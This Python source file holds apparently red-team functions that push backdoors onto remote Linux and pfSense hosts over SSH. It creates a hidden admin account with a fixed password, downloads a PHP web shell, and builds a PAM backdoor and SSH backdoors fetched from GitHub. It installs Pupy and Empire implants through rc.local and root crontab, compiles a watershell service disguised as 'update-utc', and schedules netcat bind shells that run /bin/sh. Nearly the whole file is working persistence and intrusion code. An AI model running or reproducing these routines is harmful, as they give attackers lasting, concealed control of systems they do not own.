def backdoor_user(connect):
    connect.sudo("sh -c 'useradd totally_legit_user && usermod -u 599 totally_legit_user && usermod -a -G admin "
                 "totally_legit_user && echo \"VerySecure\nVerySecure\" | passwd totally_legit_user'")


def web_shell(connect):
    connect.run("fetch https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php")
    connect.run("mv index.php /usr/local/www/WebMagic.php")


def backdoor_pam(connect):
    try:
        connect.sudo("rm -rf linux-pam-backdoor")
    except:
        pass
    connect.sudo("apt-get install git gcc make -y")
    connect.sudo("git clone https://github.com/zephrax/linux-pam-backdoor.git")
    connect.sudo("sh -c 'cd linux-pam-backdoor/ && ./backdoor.sh -v 1.1.8 -p m00dy && mv pam_unix.so /lib/x86_64-linux-gnu/security/ && cd .. && rm -rf linux-pam-backdoor/'")


def backdoor_ssh(connect):
    connect.run("wget https://raw.githubusercontent.com/iamckn/backdoors/master/bd_hide.sh")
    connect.run("wget https://raw.githubusercontent.com/iamckn/backdoors/master/bd_sshd.sh")
    connect.run("chmod +x bd_hide.sh bd_sshd.sh")
    connect.sudo("sh -c './bd_sshd.sh && ./bd_hide.sh && rm bd_*'")
# Use:
# socat STDIO TCP4:10.15.2.3:22,sourceport=19526
# totally_legit_user VerySecure

# badmin VerySecure


def pfsense_user(connect):
    connect.put('UploadFiles/system_usermanager.php', remote="/usr/local/www/")


def pupy(connect):
    #REQUIRES A CLIENT TO BE INSTALLED AND THE MALWAR
    connect.put('UploadFiles/pupy_linux')
    connect.sudo('mv pupy_linux /bin/pupy')
    connect.sudo('chmod 777 /bin/pupy')
    connect.sudo("sh -c 'printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local && /bin/./pupy'")
    connect.sudo('/bin/./pupy')


def empire(connect):
    ###NEEDS MORE WORK
    connect.put('UploadFiles/empire.sh')
    connect.sudo('mv empire.sh /var/')
    connect.run("sh -c 'echo \"@reboot sh -c 'cp /var/empire.sh /tmp/empire.sh; python /tmp/empire.sh'\" > empyre.txt'")
    connect.sudo("crontab -u root empyre.txt")
    connect.run("rm empyre.txt")
    connect.run('nohup bash /tmp/empire.sh &')


def merlin(connect):
    pass


def watershell(connect):
    connect.put('UploadFiles/watershell/watershell.c')
    connect.put('UploadFiles/watershell/watershell.h')
    connect.sudo('gcc watershell.c -o update-utc')
    connect.sudo('mv update-utc /usr/sbin/')
    connect.put('UploadFiles/update-utc.service')
    connect.sudo('mv update-utc.service /lib/systemd/system/')
    connect.sudo('chmod 664 /lib/systemd/system/update-utc.service')
    connect.sudo('systemctl daemon-reload')
    connect.sudo('systemctl enable update-utc.service')
    connect.sudo('systemctl start update-utc.service')
    connect.run("rm watershell.c watershell.h")

    # connect.sudo('screen -d -m /boot/grub/./initrdMemTest')
# nc <IP> <port> -u
# run: mkdir pwned
# Note: You will not see any output


def nomnom_ubuntu(connect):
    connect.sudo('apt update -y')
    connect.put('UploadFiles/openssh-server_7.2p2-4ubuntu2.7_amd64.deb')
    connect.sudo('apt install openssh-server -y')
    connect.sudo('dpkg -i openssh-server*.deb')
    connect.run('rm openssh-server_7.2p2-4ubuntu2.7_amd64.deb')


def vince_netcat_ubuntu(connect):
    connect.sudo("apt install netcat-traditional -y")
    connect.sudo("crontab -l | echo '*/5 * * * * nc.traditional -lvp 4444 -e /bin/sh' | crontab -")

def vince_netcat_centos(connect):
    # connect.sudo("yum install netcat -y")
    connect.sudo("crontab -l | echo '*/5 * * * * netcat -lvp 4444 -e /bin/sh' | crontab -")


def ohad_pyiris_ubuntu(connect):
    connect.sudo('apt install python-pip screen -y')
    ohad_pyiris(connect)


def ohad_pyiris_centos(connect):
    connect.sudo('yum install python-pip screen -y')
    ohad_pyiris(connect)


def ohad_pyiris(connect):
    connect.sudo('python -m pip install mss python-crontab')
    connect.put('UploadFiles/initrdMemTest')
    connect.put('UploadFiles/init-memtest.service')
    connect.sudo('mv initrdMemTest /boot/grub/')
    connect.sudo('mv init-memtest.service /etc/systemd/system/')
    connect.sudo('chmod +x /boot/grub/initrdMemTest')
    connect.sudo('chmod 664 /etc/systemd/system/init-memtest.service')
    connect.sudo('systemctl daemon-reload')
    connect.sudo('systemctl enable init-memtest.service')
    connect.sudo('systemctl start init-memtest.service')
    # connect.sudo('screen -d -m /boot/grub/./initrdMemTest')


#Depreciation Area
##########################################################################################


def ohad_vnc(connect):
    connect.sudo('sudo apt-get install vnc4server nautilus metacity -y')
    connect.sudo("sh -c 'printf \"changeme\nchangeme\n\" | vncserver '" )
    connect.sudo('mv xstartup ~/.vnc/xstartup')
    connect.sudo('chmod +x ~/.vnc/xstartup')
    connect.sudo("vncserver")

def ohad_vnc_lubuntu(connect):
    connect.put('UploadFiles/xstartup-Lubuntu')
    connect.sudo('mv xstartup-Lubuntu xstartup')
    ohad_vnc(connect)

def ohad_vnc_xubuntu(connect):
    connect.put('UploadFiles/xstartup-Xubuntu')
    connect.sudo('mv xstartup-Xubuntu xstartup')
    ohad_vnc(connect)



# Up to implementation: merlin and empyre
# https://github.com/shad0wghost/ssh-authlog-backdoor
